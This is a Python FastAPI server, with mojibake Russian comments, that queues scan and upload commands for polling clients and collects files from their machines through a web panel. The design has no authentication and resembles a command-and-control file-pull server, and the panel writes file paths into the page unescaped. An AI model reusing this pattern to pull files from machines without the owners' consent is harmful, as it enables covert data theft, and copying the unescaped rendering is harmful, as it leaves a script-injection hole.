# server.py
from fastapi import FastAPI, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, FileResponse
from pydantic import BaseModel
from typing import Dict, List
import uvicorn
import uuid
import os
from datetime import datetime
import json
import threading
import time

app = FastAPI(title="Access File Transfer Server")

# –ü–∞–ø–∫–∞ –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Ñ–∞–π–ª–æ–≤
uploaded_files_dir = "uploaded_files"
os.makedirs(uploaded_files_dir, exist_ok=True)

# –•—Ä–∞–Ω–∏–ª–∏—â–∞ –≤ –ø–∞–º—è—Ç–∏
pending_commands: Dict[str, List[dict]] = {}     # –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –∫–ª–∏–µ–Ω—Ç–æ–≤
client_files: Dict[str, List[dict]] = {}         # —Å–ø–∏—Å–∫–∏ —Ñ–∞–π–ª–æ–≤ –æ—Ç –∫–ª–∏–µ–Ω—Ç–æ–≤
uploaded_files_metadata: List[dict] = []         # –º–µ—Ç–∞–¥–∞–Ω–Ω—ã–µ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤

# –ú–æ–¥–µ–ª–∏
class ScanCommand(BaseModel):
    client_id: str

class UploadCommand(BaseModel):
    client_id: str
    filepath: str

class CommandResponse(BaseModel):
    command_id: str
    type: str
    status: str

# 1. –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
@app.post("/command/scan", response_model=CommandResponse)
async def create_scan_command(cmd: ScanCommand):
    command_id = str(uuid.uuid4())
    new_command = {
        "command_id": command_id,
        "type": "scan",
        "status": "pending"
    }
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    print(f"[+] SCAN –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è {cmd.client_id}: {command_id}")
    return CommandResponse(command_id=command_id, type="scan", status="pending")

# 2. –ó–∞–ø—Ä–æ—Å–∏—Ç—å –∑–∞–≥—Ä—É–∑–∫—É —Ñ–∞–π–ª–∞
@app.post("/command/upload", response_model=CommandResponse)
async def create_upload_command(cmd: UploadCommand):
    command_id = str(uuid.uuid4())
    new_command = {
        "command_id": command_id,
        "type": "upload",
        "filepath": cmd.filepath,
        "status": "pending"
    }
    pending_commands.setdefault(cmd.client_id, []).append(new_command)
    print(f"[+] UPLOAD –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è {cmd.client_id}: {cmd.filepath}")
    return CommandResponse(command_id=command_id, type="upload", status="pending")

# 3. –ü–æ–ª—É—á–∏—Ç—å –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –∫–ª–∏–µ–Ω—Ç–∞
@app.get("/commands/{client_id}")
async def get_commands(client_id: str):
    commands = pending_commands.get(client_id, [])
    pending = [cmd for cmd in commands if cmd["status"] == "pending"]
    return {"commands": pending}

# 4. –ö–ª–∏–µ–Ω—Ç –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–ø–∏—Å–æ–∫ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
@app.post("/files/report")
async def report_files(client_id: str = Form(...), files_json: str = Form(...)):
    try:
        files_list = json.loads(files_json)
        client_files[client_id] = [
            {"filepath": f, "reported_at": datetime.now().isoformat()} for f in files_list
        ]

        # –ü–æ–º–µ—á–∞–µ–º –∫–æ–º–∞–Ω–¥—É scan –∫–∞–∫ –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω—É—é
        if client_id in pending_commands:
            for cmd in pending_commands[client_id]:
                if cmd["type"] == "scan" and cmd["status"] == "pending":
                    cmd["status"] = "completed"
                    cmd["completed_at"] = datetime.now().isoformat()
                    cmd["file_count"] = len(files_list)
                    break

        print(f"[+] –ö–ª–∏–µ–Ω—Ç {client_id} –ø—Ä–∏—Å–ª–∞–ª {len(files_list)} —Ñ–∞–π–ª–æ–≤")
        return {"status": "success", "count": len(files_list)}
    except Exception as e:
        raise HTTPException(status_code=400, detail=f"Invalid JSON: {e}")

# 5. –ü–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ –∫–ª–∏–µ–Ω—Ç–∞
@app.get("/client/{client_id}/files")
async def get_client_files(client_id: str):
    return {"client_id": client_id, "files": client_files.get(client_id, [])}

# 6. API: –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
@app.get("/api/downloaded-files")
async def get_downloaded_files():
    return {"files": uploaded_files_metadata}

# 7. –ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞ –æ—Ç –∫–ª–∏–µ–Ω—Ç–∞ ‚Üí —Å–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
@app.post("/upload/")
async def upload_file(
    command_id: str = Form(...),
    client_id: str = Form(...),
    file: UploadFile = File(...)
):
    commands = pending_commands.get(client_id, [])
    command = next((c for c in commands if c["command_id"] == command_id), None)

    if not command:
        raise HTTPException(status_code=404, detail="Command not found")

    # –ì–µ–Ω–µ—Ä–∏—Ä—É–µ–º –±–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏–º—è
    safe_filename = file.filename.replace("/", "_").replace("\\", "_")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    save_path = os.path.join(uploaded_files_dir, f"{client_id}_{timestamp}_{safe_filename}")

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º —Ñ–∞–π–ª
    content = await file.read()
    with open(save_path, "wb") as f:
        f.write(content)

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—Ç–∞—Ç—É—Å –∫–æ–º–∞–Ω–¥—ã
    command["status"] = "completed"
    command["saved_as"] = save_path
    command["filename"] = file.filename
    command["size"] = len(content)
    command["completed_at"] = datetime.now().isoformat()

    # –î–æ–±–∞–≤–ª—è–µ–º –≤ –∏—Å—Ç–æ—Ä–∏—é
    uploaded_files_metadata.append({
        "command_id": command_id,
        "client_id": client_id,
        "filename": file.filename,
        "saved_path": save_path,
        "size": len(content),
        "uploaded_at": command["completed_at"]
    })

    print(f"[+] –§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω: {save_path}")
    return {"status": "success", "command_id": command_id}

# 8. –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –Ω–∞ —Å–≤–æ–π –∫–æ–º–ø—å—é—Ç–µ—Ä
@app.get("/download/{command_id}")
async def download_file(command_id: str):
    file_record = next((f for f in uploaded_files_metadata if f["command_id"] == command_id), None)

    if not file_record or not os.path.exists(file_record["saved_path"]):
        raise HTTPException(status_code=404, detail="–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω")

    return FileResponse(
        path=file_record["saved_path"],
        filename=file_record["filename"],
        media_type="application/octet-stream"
    )

# 9. –ì–ª–∞–≤–Ω–∞—è —Å—Ç—Ä–∞–Ω–∏—Ü–∞ ‚Äî –≤–µ–±-–∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å
@app.get("/", response_class=HTMLResponse)
async def main_page():
    return """
    <html>
        <head><title>üìÅ Access File Transfer</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #f5f5f5; }
            .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
            input, button { padding: 10px; font-size: 16px; margin: 5px; }
            .section { margin-top: 40px; }
            .file-item { padding: 15px; border: 1px solid #eee; margin: 10px 0; border-radius: 5px; display: flex; justify-content: space-between; align-items: center; }
            .file-info { flex: 1; }
            .file-name { font-weight: bold; word-break: break-all; }
            .file-meta { color: #666; font-size: 14px; }
            .btn { padding: 8px 15px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; }
            .btn:hover { background: #218838; }
            .btn-upload { background: #007bff; }
            .btn-upload:hover { background: #0056b3; }
        </style>
        </head>
        <body>
            <div class="container">
                <h1>üìÅ Access File Transfer</h1>
                <div>
                    <input type="text" id="clientId" placeholder="ID –∫–ª–∏–µ–Ω—Ç–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä: client_office_01)" value="client_office_01" />
                    <button onclick="scanFiles()">üîç –ó–∞–ø—Ä–æ—Å–∏—Ç—å —Å–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤ Access</button>
                </div>

                <div id="filesContainer" class="section"></div>

                <div class="section">
                    <h3>‚¨áÔ∏è –ó–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã</h3>
                    <div id="downloadedFilesContainer">
                        <p>–ó–¥–µ—Å—å –ø–æ—è–≤—è—Ç—Å—è —Ñ–∞–π–ª—ã –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏.</p>
                    </div>
                </div>
            </div>

            <script>
                async function scanFiles() {
                    const clientId = document.getElementById('clientId').value;
                    const res = await fetch('/command/scan', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({client_id: clientId})
                    });
                    const data = await res.json();
                    alert('–ö–æ–º–∞–Ω–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞: ' + data.command_id);
                    loadFiles();
                }

                async function loadFiles() {
                    const clientId = document.getElementById('clientId').value;
                    const res = await fetch('/client/' + clientId + '/files');
                    const data = await res.json();

                    const container = document.getElementById('filesContainer');
                    container.innerHTML = `
                        <h3>–§–∞–π–ª—ã –∫–ª–∏–µ–Ω—Ç–∞: ${clientId}</h3>
                        ${data.files.length ? data.files.map(f => `
                            <div class="file-item">
                                <div class="file-info">
                                    <div class="file-name">${f.filepath}</div>
                                    <div class="file-meta">–ù–∞–π–¥–µ–Ω: ${new Date(f.reported_at).toLocaleString()}</div>
                                </div>
                                <button class="btn btn-upload" onclick="uploadFile('${clientId}', '${encodeURIComponent(f.filepath)}')">üì§ –ó–∞–≥—Ä—É–∑–∏—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä</button>
                            </div>
                        `).join('') : '<p>–§–∞–π–ª–æ–≤ –ø–æ–∫–∞ –Ω–µ—Ç. –ù–∞–∂–º–∏—Ç–µ "–ó–∞–ø—Ä–æ—Å–∏—Ç—å", –µ—Å–ª–∏ –µ—â—ë –Ω–µ –¥–µ–ª–∞–ª–∏.</p>'}
                    `;
                }

                async function uploadFile(clientId, filepath) {
                    if (!confirm("–í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —ç—Ç–æ—Ç —Ñ–∞–π–ª –Ω–∞ —Å–µ—Ä–≤–µ—Ä?")) return;

                    const res = await fetch('/command/upload', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({client_id: clientId, filepath: decodeURIComponent(filepath)})
                    });
                    const data = await res.json();
                    if (data.status === "success") {
                        alert("‚úÖ –§–∞–π–ª –¥–æ–±–∞–≤–ª–µ–Ω –≤ –æ—á–µ—Ä–µ–¥—å. –ö–ª–∏–µ–Ω—Ç –∑–∞–≥—Ä—É–∑–∏—Ç –µ–≥–æ –ø—Ä–∏ —Å–ª–µ–¥—É—é—â–µ–º –æ–ø—Ä–æ—Å–µ.");
                        loadDownloadedFiles();
                    } else {
                        alert("‚ùå –û—à–∏–±–∫–∞: " + data.message);
                    }
                }

                async function loadDownloadedFiles() {
                    const res = await fetch('/api/downloaded-files');
                    const data = await res.json();

                    const container = document.getElementById('downloadedFilesContainer');
                    container.innerHTML = `
                        ${data.files.length ? data.files.map(f => `
                            <div class="file-item">
                                <div class="file-info">
                                    <div class="file-name">${f.filename} (${(f.size / 1024).toFixed(1)} –ö–ë)</div>
                                    <div class="file-meta">–ö–ª–∏–µ–Ω—Ç: ${f.client_id} | ${new Date(f.uploaded_at).toLocaleString()}</div>
                                </div>
                                <button class="btn" onclick="location.href='/download/${f.command_id}'">‚¨áÔ∏è –°–∫–∞—á–∞—Ç—å –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä</button>
                            </div>
                        `).join('') : '<p>–ù–µ—Ç –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤.</p>'}
                    `;
                }

                // –ó–∞–≥—Ä—É–∂–∞–µ–º –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏
                loadFiles();
                loadDownloadedFiles();

                // –ê–≤—Ç–æ–æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–∞–∂–¥—ã–µ 10 —Å–µ–∫
                setInterval(() => {
                    loadFiles();
                    loadDownloadedFiles();
                }, 10000);
            </script>
        </body>
    </html>
    """

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)